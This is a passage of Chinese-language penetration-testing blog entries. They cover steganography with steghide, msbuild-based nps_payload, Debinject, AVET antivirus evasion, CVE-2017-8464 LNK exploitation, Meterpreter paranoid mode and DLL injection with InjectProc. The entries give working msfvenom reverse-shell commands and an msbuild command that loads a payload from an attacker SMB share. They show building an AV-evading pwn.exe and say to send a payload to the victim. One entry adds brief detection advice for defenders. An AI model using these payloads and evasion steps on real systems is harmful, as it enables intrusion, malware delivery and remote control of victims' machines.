        <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/B8483F0FB6504AD4DAA52324194E00A5.png" alt="enter description here"></p><span id="more"></span><p>  在过去的几年中，“隐写术”这个术语引起了执法部门的广泛关注。黑客曾使用这项技术来将他们的秘密信息传递给恐怖分子。黑客们在911恐怖袭击事件中也使用了隐写术。所以，如果你对计算机安全很感兴趣，那么你必须得知道隐写术。在这篇文章中，我们将会揭开隐写术的神秘面纱，并向大家介绍一些可供使用的工具。</p><p>隐写术是一种隐藏信息的方法，它可以在看似正常的信息中隐藏私密信息。它常用于某些秘密信息的传输，而且中间人没有办法能够知道你所想传达的真实信息到底是什么。这项信息隐藏技术在真实的日常通讯中已经使用了很多年了。由于数字通讯技术的不断发展，这项技术同样在数字通讯中得到了广泛的应用。在计算机中，可以将常规文件中无用的或无价值的数据位替换成你的秘密信息。这些信息可以隐藏于明文，密文，以及图片之中。你可以将信息隐藏于任何文件中。现在，有很多工具可以让你将秘密信息隐藏于图片文件或者音频文件之中。</p><p>使用隐写术的一个最主要的原因就是，你需要在一个普通文件中隐藏你的私密消息，而且没人会怀疑这个文件。人们会认为这是一个普通文件，这样一来你的秘密信息就不会被发现了，而且仅仅查看这些文件并不能发现你的秘密。有很多种情况需要保护文件传输的安全。现在到处都是黑客，而且他们总是在尝试拦截通讯信息从而获取机密数据。通过使用隐写术，我们可以降低数据泄漏的概率。即便是黑客得到了你的账户和邮箱的访问权限，他也无法得到你账户中的机密文件。</p><p>有很多种方法可以让你在数字通讯中使用隐写术。而且，你不需要通过输入代码来实现这个功能。现在有大量的软件工具可以执行隐写术。这种软件可以将你的秘密信息隐藏于图片文件，HTML网页文件，DOC文件，以及其他种类的文件之中。<br>(摘自安全客 <a href="http://bobao.360.cn/learning/detail/441.html">http://bobao.360.cn/learning/detail/441.html</a> )<br>&nbsp;<br>1.steghide 安装<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1501507632891.jpg" alt="enter description here"><br>&nbsp;<br>2.帮助参数<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1501507699467.jpg" alt="enter description here"><br>&nbsp;<br>3.新建一个文本文档比如：demon.txt<br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1501507841125.jpg" alt="enter description here"><br>&nbsp;<br>4.内容如下！<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1501507970331.jpg" alt="enter description here"><br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1501508634995.jpg" alt="enter description here"><br>&nbsp;<br>将root目录下 demon.txt 数据写入到1.jpg中<br>1.在帮助参数中的embed (emdeb data)<br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1501508610719.jpg" alt="enter description here"><br>&nbsp;<br>&nbsp;<br>需要被嵌入的文件<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1501509156634.jpg" alt="enter description here"><br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1501509028573.jpg" alt="enter description here"><br>&nbsp;<br>需要嵌入的文件<br>&nbsp;<br>5.设置密码 ，隐写写入完成<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1501509278287.jpg" alt="enter description here"><br>&nbsp;<br>6.分离数据，当分离数据的时候需要输入嵌入数据的时候设置的密码<br>&nbsp;<br> <img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1501509577684.jpg" alt="extract"><br> &nbsp;<br> <img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1501509735720.jpg" alt="enter description here"><br>  &nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1501509470991.jpg" alt="enter description here"><br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1501509754056.jpg" alt="enter description here"><br>&nbsp;<br>链接资料：<br><a href="https://www.youtube.com/watch?v=gfLGvMdeE-4">https://www.youtube.com/watch?v=gfLGvMdeE-4</a></p>]]></content>
      
      
      <categories>
          
          <category> kali </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nop-Payload</title>
      <link href="/nop-payload.html"/>
      <url>/nop-payload.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/B47A30EF9D6D80AB3A6721846F343D42.png" alt="enter description here"></p><span id="more"></span><h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><iframe     width="800"     height="450"     src='https://demonsec666.oss-cn-qingdao.aliyuncs.com/nop-payload.mp4'    frameborder="0"     allowfullscreen></iframe><p>新工具发布：NPS_Payload</p><p>在过去一年中，我们看到了大量的研究成果，其中强调了Microsoft的本机二进制文件，这些二进制文件可以被攻击者利用来妥协或获取系统访问权限。这些二进制文件之一msbuild.exe已被证明是非常可靠的，允许我们在后处理场景中在主机上获取shell。</p><p>Casey Smith（@subtee）撰写了几篇关于如何使用msbuild.exe从.csproj或.xml文件执行代码的文章。Casey发现有几个部分允许有人添加任何想要的代码，当msbuild.exe分析文件时，它将执行这些代码块。这允许一个人将任何C＃代码添加到csproj或xml文件中。</p><p>两个TrustedSec团队成员Larry Spohn和Ben Mauch决定将Ben的“不PowerShell”（NPS）和Dave Kennedy的独角兽和Casey的示例一起进行了一些功能的混合，并提出了一个新的工具称为nps_payload。<br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/nps_payload_1.png" alt="enter description here"><br>&nbsp;<br>此工具提供了一种生成将被插入到msbuild_nps.xml文件中的PowerShell有效负载的方法，并且当msbuild.exe运行文件时将使用nps来执行有效负载。类似于Dave Kennedy的独角兽，nps_payload还提供了一个Metasploit控制台资源（msbuild_nps.rc）文件。<br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/nps_payload_2.png" alt="enter description here"><br>&nbsp;<br>有两种方法可以部署msbuild_nps.xml文件。第一个是将msbuild_nps.xml文件复制到远程主机，然后使用以下命令执行。</p><p>C：\ Windows \ Microsoft.NET \ Framework \ v4.0.30319 \ msbuild.exe C：\ &lt;path_to_msbuild_nps.xml&gt;</p><p>第二种方法是在SMB共享上托管msbuild_nps.xml文件，并使用UNC路径与msbuild.exe命令指向xml文件。</p><p>C：\ Windows \ Microsoft.NET \ Framework \ v4.0.30319 \ msbuild.exe \ <attacker_ip> \ <share> \ msbuild_nps.xml</p><p>这将使用nps运行编码的PowerShell有效载荷，并将返回一个shell到攻击者。一旦攻击者迁移到新进程，msbuild.exe将退出。重要的是要注意，nps执行PowerShell代码而不调用powershell.exe，不会显示在事件ID 4688（新建进程）中。</p><p>对于Defenders，您可以通过监视任何调用msbuild.exe的事件ID 4688事件来检测此攻击，然后检查任何对UNC或本地文件的引用的命令行参数。您还可以启用PowerShell日志记录并监视事件ID 4104事件，并查找已编码的任何PowerShell代码。</p><p>github :<a href="http://www.github.com/trustedsec/nps_payload">www.github.com/trustedsec/nps_payload</a><br><a href="https://www.trustedsec.com/2017/07/new-tool-release-nps_payload/">https://www.trustedsec.com/2017/07/new-tool-release-nps_payload/</a></p><h2 id="安装部分"><a href="#安装部分" class="headerlink" title="安装部分"></a>安装部分</h2><pre>pip install -r requirements.txtapt-get install samba vi / nano / whatever /etc/samba/smb.conf 3.）将以下内容添加到文件的底部（酌情更改）[payloads$] comment = Dirty Payloadspath = /opt/shares/payloads browsable = yesguest ok = yes read only = yes service smbd restart </pre><p> 接下来 看视频如何操作演示的吧！！</p>]]></content>
      
      
      <categories>
          
          <category> Metasploit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Metasploit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Debinject--Hacking funny for linux</title>
      <link href="/Debinject.html"/>
      <url>/Debinject.html</url>
      
        <content type="html"><![CDATA[<h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><iframe     width="800"     height="450"     src='https://demonsec666.oss-cn-qingdao.aliyuncs.com/Debinjec.mp4'    frameborder="0"     allowfullscreen></iframe>&nbsp;<p>通过将Metasploit的payload 注入正常的deb包<br>链接：<a href="https://github.com/UndeadSec/Debinject/blob/master/debinject.py">https://github.com/UndeadSec/Debinject/blob/master/debinject.py</a><br><a href="https://www.youtube.com/watch?v=wpzrK6K-e14">https://www.youtube.com/watch?v=wpzrK6K-e14</a></p>]]></content>
      
      
      <categories>
          
          <category> ATT&amp;CK </category>
          
          <category> Metasploit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ATT&amp;CK </tag>
            
            <tag> linux </tag>
            
            <tag> Metasploit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Metasploit系列课程第八课</title>
      <link href="/MSF8-0.html"/>
      <url>/MSF8-0.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1498995788979.jpg" alt="enter description here"></p><span id="more"></span><h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>Metasploit系列课程第八课 最后的最后一课。这次和以往不同，最后一课不打算用视频，想用文章的形式给各位体现，说实在的个人的时间实在不太充裕，也是最近抽空给各位写下这篇文章。。。<br>&nbsp;<br>Metasploit 系列教程  &#x3D;&gt; 链接:<a href="https://pan.baidu.com/s/1dFzPkJZ">https://pan.baidu.com/s/1dFzPkJZ</a> 密码:evwg<br> 周年庆版 V1.6 github &#x3D;&gt;<a href="https://github.com/demonsec666/secist_script">https://github.com/demonsec666/secist_script</a></p><h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>Metasploit系列课程第八课这次使用到的工具呢是(AVET)</p><p>1.下载地址 :  <a href="https://github.com/govolution/avet">https://github.com/govolution/avet</a> (其中的几篇pdf 文章不错)<br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1498995978528.jpg" alt="enter description here"><br>&nbsp;<br>2.在kali中使用这款工具呢。作者提示我们需要安装一样编译器是（tdm-gcc）（作者提供我的，不知道为什么装不上，所以我从官网上下载了，各位也可以使用我提供的）<br><a href="http://tdm-gcc.tdragon.net/download">http://tdm-gcc.tdragon.net/download</a>   链接:<a href="https://pan.baidu.com/s/1dFzPkJZ">https://pan.baidu.com/s/1dFzPkJZ</a> 密码:evwg<br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1498996174820.jpg" alt="enter description here"><br>&nbsp;<br>3.我们下载完后，将开始使用wine 在kali上安装tdm-gcc（在kali中会有中文乱码，可以跟着我图中步骤走，左图为我mac ，右图为kali 使用wine的情况，因时间关系我未去解决编码的问题，先凑合着看）<br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1498997269209.jpg" alt="enter description here"><br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1498996586904.jpg" alt="enter description here"><br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1498996688455.jpg" alt="enter description here"><br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1498996753536.jpg" alt="enter description here"><br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1498996825354.jpg" alt="enter description here"><br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1498996885631.jpg" alt="enter description here"><br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1498996998833.jpg" alt="enter description here"><br>&nbsp;<br>正在安装<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1498997015884.jpg" alt="enter description here"><br>&nbsp;<br>安装完毕<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1498997099344.jpg" alt="enter description here"><br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1498997137286.jpg" alt="enter description here"><br>&nbsp;<br>&nbsp;</p><h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><ol><li>我们看下大致的目录情况<br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1498997475884.jpg" alt="enter description here"><br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1498997487062.jpg" alt="enter description here"><br>&nbsp;<br> 2.使用方法根据作者提示给我们的是这样的<br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1498997239538.jpg" alt="enter description here"><br>&nbsp;<pre>root@kalidan:~/tools/avet# ./build/build_win32_meterpreter_rev_https_20xshikata.sh</pre>那么我们可以看到他这边调用的是build的目录下的 build_win32_meterpreter_rev_https_20xshikata.sh,使用shell脚本<br>我们大致的看下这个脚本的代码：<pre></li></ol><p>#build_win64_meterpreter_rev_tcp_xor<br>环境变量定义<br>. avet&#x2F;build&#x2F;global_win64.sh</p><h1 id="make-meterpreter-reverse-payload"><a href="#make-meterpreter-reverse-payload" class="headerlink" title="make meterpreter reverse payload"></a>make meterpreter reverse payload</h1><p>#制作msf reverse payload<br>msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;xxxxx  lport&#x3D;xxx -e x64&#x2F;xor -f c –platform Windows &gt; avet&#x2F;sc.txt<br>#make_avet 格式化 这个 shellcode<br>.&#x2F;avet&#x2F;format.sh avet&#x2F;sc.txt &gt; avet&#x2F;scclean.txt &amp;&amp; rm avet&#x2F;sc.txt<br>#调用 make_avet, compile<br>.&#x2F;avet&#x2F;make_avet -f avet&#x2F;scclean.txt -X -E<br>$win64_compiler -o output&#x2F;pwn.exe avet.c<br>输出pwn.exe </p><h1 id="cleanup"><a href="#cleanup" class="headerlink" title="cleanup"></a>cleanup</h1><p>rm avet&#x2F;scclean.txt &amp;&amp; echo “” &gt; avet&#x2F;defs.h<br></pre><br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1498998133097.jpg" alt="enter description here"><br>&nbsp;<br>3. 使用制作payload执行的过程</p><p>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1498998245364.jpg" alt="enter description here"><br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1498998316743.jpg" alt="enter description here"><br>&nbsp;<br>4.其中只要我们修改的代码呢其实就是msfvenom那段代码 将LHOST 和LPORT 改成自己想要的就可以了</p><pre>msfvenom -p windows/meterpreter/reverse_https lhost=192.168.116.128 lport=443 -e x86</pre><p>那么我们重新生成一次，并手动的开启MSF 。<br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1499000792945.jpg" alt="enter description here"><br>&nbsp;<br>在运行之前我们可以对pwn.exe检测一次是否能绕过AV<br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1498999379841.jpg" alt="enter description here"><br>&nbsp;<br>效果还算是理想<br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1499000080489.jpg" alt="enter description here"><br>&nbsp;<br>运行 制作成的pwn.exe后 得到meterpreter.<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1499001086561.jpg" alt="enter description here"><br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1499001129527.jpg" alt="enter description here"><br>&nbsp;<br>那么shell脚本下 可以这么写<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1499002903000.jpg" alt="enter description here"><br>&nbsp;<br>项目已经上传在GitHub项目中了<br>最后的彩蛋 我使用ruby 做的GUI&#x3D;&gt; GTK </p><h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><iframe     width="800"     height="450"     src='https://demonsec666.oss-cn-qingdao.aliyuncs.com/secistGUI.mp4'    frameborder="0"     allowfullscreen></iframe>]]></content>
      
      
      <categories>
          
          <category> Metasploit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Metasploit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2017-8464</title>
      <link href="/CVE-2017-8464.html"/>
      <url>/CVE-2017-8464.html</url>
      
        <content type="html"><![CDATA[<h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><iframe     width="800"     height="450"     src='https://demonsec666.oss-cn-qingdao.aliyuncs.com/CVE-17-8464.mp4'    frameborder="0"     allowfullscreen></iframe>&nbsp;<p>2017年6月13日，微软官方发布编号为CVE-2017-8464的漏洞公告，官方介绍Windows系统在解析快捷方式时存在远程执行任意代码的高危漏洞，黑客可以通过U盘、网络共享等途径触发漏洞，完全控制用户系统，安全风险高危<br>漏洞描述<br>攻击者可以向用户呈现包含恶意的.LNK文件和相关联的恶意二进制文件的可移动驱动器或远程共享。 当用户在Windows资源管理器或解析.LNK文件的任何其他应用程序中打开此驱动器（或远程共享）时，恶意二进制程序将在目标系统上执行攻击者选择的代码，成功利用此漏洞的攻击者可以获得与本地用户相同的用户权限。<br>注释:.LNK是windows系统内应用程序快捷方式文件的文件类型后缀名。<br>漏洞利用条件和方式:<br>远程利用 漏洞影响范围:<br>Microsoft Windows 10 Version 1607 for 32-bit SystemsMicrosoft Windows 10 Version 1607 for x64-based SystemsMicrosoft Windows 10 for 32-bit SystemsMicrosoft Windows 10 for x64-based SystemsMicrosoft Windows 10 version 1511 for 32-bit SystemsMicrosoft Windows 10 version 1511 for x64-based SystemsMicrosoft Windows 10 version 1703 for 32-bit SystemsMicrosoft Windows 10 version 1703 for x64-based SystemsMicrosoft Windows 7 for 32-bit Systems SP1Microsoft Windows 7 for x64-based Systems SP1Microsoft Windows 8.1 for 32-bit SystemsMicrosoft Windows 8.1 for x64-based SystemsMicrosoft Windows RT 8.1</p><p>这次使用的PAYLOAD 是msf的regsvr32_applocker_bypass_server模块 同样也是使用的是powershell，<br>看完少宇大牛的视频后，也是收到了一些启发，<br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1497711066626.jpg" alt="enter description here"><br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1497711486657.jpg" alt="enter description here"><br>&nbsp;<br>点击快捷键，即可调用相关系统应用 外加我们构造好的PAYLOAD 就可以获取会话，其实也是比较简单的，我这里就不在多说了 一切都在视频中，慢慢欣赏。<br>值得提一句的是 本次使用的脚本 已在我之前github中上传过的：<a href="https://github.com/demonsec666/secist_script.git">https://github.com/demonsec666/secist_script.git</a><br>也可以观看我的youtube视频 ：<a href="https://www.youtube.com/watch?v=SdPSAakZDjA">https://www.youtube.com/watch?v=SdPSAakZDjA</a></p>]]></content>
      
      
      <categories>
          
          <category> CVE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Meterpreter-Paranoid</title>
      <link href="/Meterpreter-Paranoid.html"/>
      <url>/Meterpreter-Paranoid.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/Untitled.png" alt="enter description here"></p><span id="more"></span><p>前段日子看到r00t-3xp10it 大牛出了个新教程，自己也打算尝试下 ，<br><a href="https://github.com/r00t-3xp10it/Meterpreter_Paranoid_Mode-SSL">https://github.com/r00t-3xp10it/Meterpreter_Paranoid_Mode-SSL</a><br>&nbsp;</p><h2 id="github的介绍："><a href="#github的介绍：" class="headerlink" title="github的介绍："></a>github的介绍：</h2><p>meterpreter_paranoid_mode.sh允许用户安全上演&#x2F;无级连接Meterpreter经检查合格证书的处理程序正在连接到。</p><p>我们开始通过PEM格式的证书生成，一旦证书有我们可以创建一个HTTP或HTTPS或EXE有效载荷，并给予<br>它是用来验证连接的PEM格式证书的路径。</p><p>要验证连接，我们需要告诉有效负载什么证书处理程序将通过设置handlersslcert选项然后使该证书的检查<br>设置stagerverifysslcert真实。</p><p>一旦创建了有效负载，我们就需要创建一个处理程序来接收连接，并再次使用PEM证书，以便处理程序可以使用为验证SHA1哈希。就像是有效载荷一样，我们设置参数。</p><p>handlersslcert路径的PEM文件和stagerverifysslcert真实。</p><h2 id="实验-验证"><a href="#实验-验证" class="headerlink" title="实验&amp;验证"></a>实验&amp;验证</h2><p>0x00<br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1497279581594.jpg" alt="enter description here"><br>&nbsp;<br>首先下载，然后进入目录给予权限。</p><pre>git clone https://github.com/r00t-3xp10it/Meterpreter_Paranoid_Mode-SSL.git</pre><p>&nbsp;<br>0x01<br>运行Meterpreter_Paranoid_Mode.sh<br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1497279712213.jpg" alt="enter description here"><br>&nbsp;<br>0x02<br>回车后我们可以看到，比如选择impersonate domain (模拟域),点击确定后，让我们随便输入一个 网站地<br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1497280010639.jpg" alt="enter description here"><br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1497280150458.jpg" alt="enter description here"><br>&nbsp;<br>我这边就习惯性的输入了一个百度网址。然后确定。<br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1497280204379.jpg" alt="enter description here"><br>&nbsp;<br>同时这边在output 会生成一个<a href="http://www.baidu.com.pem/">www.baidu.com.pem</a>  RSA私钥文件<br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1497280288089.jpg" alt="enter description here"><br>&nbsp;<br>0x03<br>&nbsp;<br>选择我们要输出的payload 的格式 bat&#x2F;exe,我这边选择的是bat，点击确定，exe没来得及测试。<br>&nbsp; </p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1497280322292.jpg" alt="enter description here"><br>&nbsp;<br>以及这边让我们输入攻击者的ip和端口，以及我们的msf的PAYLOAD 反向shell连接方式。<br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1497280533182.jpg" alt="enter description here"><br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1497280579273.jpg" alt="enter description here"><br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1497280600370.jpg" alt="enter description here"><br>&nbsp;<br>开始构建payload，并且开启msf<br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1497280693129.jpg" alt="enter description here"><br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1497280752359.jpg" alt="enter description here"><br>&nbsp;<br>0x04<br>最后将bat发给受害者运行即可，返回meterpreter.<br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1497280877395.jpg" alt="enter description here"><br>&nbsp;<br>END……………….<br>THANKS……..</p>]]></content>
      
      
      <categories>
          
          <category> Metasploit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Metasploit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>InjectProc&amp;Metasploit</title>
      <link href="/InjectProc.html"/>
      <url>/InjectProc.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1496580960878.jpg" alt="enter description here"></p><span id="more"></span><h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><iframe     width="800"     height="450"     src='https://demonsec666.oss-cn-qingdao.aliyuncs.com/InjectPro.mp4'    frameborder="0"     allowfullscreen></iframe><h2 id="InjectProc"><a href="#InjectProc" class="headerlink" title="InjectProc"></a>InjectProc</h2><p>流程注入是一种非常受欢迎的方法来隐藏代码的恶意行为，并被恶意软件作者大量使用。</p><p>有几种技术，通常使用：DLL注入，过程替换（也称为工艺空心），钩注射和APC注射。</p><p>大多数使用相同的Windows API函数：OpenProcess，VirtualAllocEx，WriteProcessMemory，有关这些功能的详细信息，请使用MSDN。<br>&nbsp;</p><h2 id="DLL注入："><a href="#DLL注入：" class="headerlink" title="DLL注入："></a>DLL注入：</h2><p>打开目标进程。<br>分配空间<br>将代码写入远程进程。<br>执行远程代码。<br>&nbsp;<br>具体可以看看github内容介绍。<br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1496581431258.jpg" alt="enter description here"><br>&nbsp;<br>我看了大牛的视频自己学着模仿了一下<br>使用的InjectProc.exe在cmd运行<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1496581536842.jpg" alt="enter description here"><br>&nbsp;<br>这位大牛在视频中演示四个部分 ，我自己也尝试了模仿了其中的一段，觉得不错，我将自己经验分享给各位。<br>首先我使用的是——  InjectProc.exe  dll_inj  path&#x2F;to&#x2F;dll.dll  notepad.exe<br>&nbsp;<br>首先下载到我的桌面，<a href="https://github.com/secrary/InjectProc">https://github.com/secrary/InjectProc</a> ，和下载InjectProc.exe，是那位大牛制作完成的。<br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1496582442573.jpg" alt="enter description here"><br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1496582390129.jpg" alt="enter description here"><br>&nbsp;</p><h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>首先打开我们的cmd 进入 InjectProc 目录当中，我们可以看到的目录。<br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1496582636284.jpg" alt="enter description here"><br>&nbsp;<br>我们运行InjectProc.exe，并且使用dll_inj 参数，加上xxx.dll的路径 ，加上要注入的进程<br>InjectProc.exe  dll_inj  path&#x2F;to&#x2F;dll.dll  notepad.exe。<br>在这里我们使用InjectProc\test_files目录中的<img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1496583170345.jpg" alt="enter description here">，并且我们随机打开一个进程如记事本进程。<br>使用以下命令：得到 mbox.exe—-InjectProc弹框。并杀软未拦截的情况<br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1496583297150.jpg" alt="enter description here"><br>&nbsp;</p><h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>那么我们可以想到前阵子NSA 的工具包 使用msf生成的dll，得到会话。那么我们可以做下以下实验。<br>首先我们使用msfvenom 生成dll</p><pre>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.102 LPORT=5555 -f dll >demon.dll</pre><p>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1496583594241.jpg" alt="enter description here"><br>&nbsp;<br>以及打开我们的msf开启监听<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1496583722323.jpg" alt="enter description here"><br>&nbsp;<br>那么我们将生成好的dll 丢到InjectProc目录中的随便一个文件中，比如我丢到InjectProc\test_files中<img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1496584076334.jpg" alt="enter description here"><br>&nbsp;<br>使用以下命令,并且打开记事本。<br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1496584220484.jpg" alt="enter description here"><br>&nbsp;<br>得到最终会话<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1496580960878.jpg" alt="enter description here"><br>&nbsp;<br>&nbsp;<br>&nbsp;<br>视频资料：<a href="https://www.youtube.com/watch?v=GT9nBuXatmU">https://www.youtube.com/watch?v=GT9nBuXatmU</a>   InjectProc | Process Injection Techniques | Malware<br><a href="https://www.pinterest.com/penetrationtesting/">https://www.pinterest.com/penetrationtesting/</a><br><a href="https://github.com/secrary/InjectProc">https://github.com/secrary/InjectProc</a>   github</p>]]></content>
      
      
      <categories>
          
          <category> Metasploit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Metasploit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Metasploit系列课程第八课预览版</title>
      <link href="/msf8.html"/>
      <url>/msf8.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2756ce21b7fbad2e65a838ec512af025.jpg" alt="enter description here"></p><span id="more"></span><p> 上回说书到： 坏人有坏人的气魄，规矩有规矩的眉角，如果说机器人是男人的浪漫，那么007就是男人的憧憬了，又帅有叼，又能干，永远帅气的一击必杀目标，又有大把大把花不完的钞票，但是在这残酷的现实中，还是醒醒吧，这些神奇的事情只会发生在电影中，是不会发生在我们这些鲁肥宅的身上的。</p><p> 敬请期待最终版<br> <img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/5529FAB8-F4CB-4274-AA46-F42083C90143.png" alt="enter description here"></p><h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><iframe     width="800"     height="450"     src='https://demonsec666.oss-cn-qingdao.aliyuncs.com/avet.mp4'    frameborder="0"     allowfullscreen></iframe><h2 id="预知后事如何，请听下回分解！"><a href="#预知后事如何，请听下回分解！" class="headerlink" title="预知后事如何，请听下回分解！"></a>预知后事如何，请听下回分解！</h2><p>&nbsp;<br>最后结语：其实自己想了挺多了 不知道是不是该结束msf这堂课呢，其实那一天想了很久，真的不太确定自己是否该不该退出这个圈子呢？或许没有答案，又或者我又找到了自己人生的另一半了呢，我或将开启自己又是一个新的旅程了呢！<br>加油吧！各位 或将开启你自己的旅程！为了自己，为了未来，加油奋斗<br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/0926d2c864d2a7fca2ef33cb3682420f.jpeg" alt="enter description here"></p>]]></content>
      
      
      <categories>
          
          <category> Metasploit </category>
          
